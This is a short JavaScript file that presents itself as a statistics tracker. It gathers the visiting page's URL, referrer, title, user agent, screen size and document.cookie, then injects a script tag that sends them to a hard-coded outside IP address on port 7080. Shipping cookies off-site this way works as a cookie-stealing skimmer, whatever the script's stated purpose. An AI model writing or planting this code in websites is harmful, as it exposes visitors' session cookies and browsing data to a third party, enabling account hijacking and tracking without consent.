var param=collectParam();
httpReq("http://210.44.176.245:7080/statistic/passport.js",param);
function collectParam(){
    var param='?';
    param=param+"&url="+document.URL;
    param=param+"&refer="+document.referrer;
    param=param+"&title="+document.title;
    param=param+"&charset="+document.charset;
    param=param+"&readyState="+document.readyState;
    param=param+"&cookie="+document.cookie;
    param=param+"&userAgent="+navigator.userAgent; 
    param=param+"&language="+navigator.language;
    param=param+"&screenWidth="+window.screen.width;
    param=param+"&screenHeight="+window.screen.height;
    return param;
}
function httpReq(url,param) {
    var myScript= document.createElement("script");
    myScript.type = "text/javascript";
    myScript.src=url+param;
    document.body.appendChild(myScript);  
}
